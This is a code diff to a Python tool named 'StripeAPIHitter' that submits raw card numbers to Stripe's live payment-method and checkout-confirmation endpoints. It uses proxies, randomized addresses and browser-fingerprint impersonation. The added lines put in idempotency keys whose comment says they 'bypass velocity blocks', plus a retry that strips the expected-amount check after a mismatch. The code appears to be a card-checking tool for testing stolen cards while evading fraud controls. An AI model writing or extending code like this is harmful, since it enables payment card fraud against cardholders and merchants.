@@ -539,6 +539,11 @@ class StripeAPIHitter:
 
                 address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)
     
+                # Generate perfectly formatted Idempotency Keys to bypass velocity blocks
+                import uuid
+                pm_idempotency = str(uuid.uuid4())
+                confirm_idempotency = str(uuid.uuid4())
+    
                 # Step 1: Tokenize the raw card into a PaymentMethod
                 pm_url = "https://api.stripe.com/v1/payment_methods"
                 pm_data = {
@@ -558,8 +563,11 @@ class StripeAPIHitter:
                     "key": self.pk_live,
                 }
                 
+                pm_headers = headers.copy()
+                pm_headers["Idempotency-Key"] = pm_idempotency
+                
                 loop = asyncio.get_event_loop()
-                pm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(pm_url, headers=headers, data=pm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                pm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(pm_url, headers=pm_headers, data=pm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                 pm_json = pm_res.json()
                 
                 if 'id' not in pm_json:
@@ -581,15 +589,18 @@ class StripeAPIHitter:
                 if self.raw_amount is not None:
                     confirm_data["expected_amount"] = self.raw_amount
                 
+                confirm_headers = headers.copy()
+                confirm_headers["Idempotency-Key"] = confirm_idempotency
+                
                 loop = asyncio.get_event_loop()
-                confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=confirm_headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                 confirm_json = confirm_res.json()
                 
                 # Dynamic Amount Mismatch Bypass
                 # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
                 if confirm_res.status_code != 200 and confirm_json.get('error', {}).get('code') == 'checkout_amount_mismatch' and 'expected_amount' in confirm_data:
                     del confirm_data['expected_amount']
-                    confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                    confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=confirm_headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                     confirm_json = confirm_res.json()
                 
                 result['response_time'] = time.time() - start
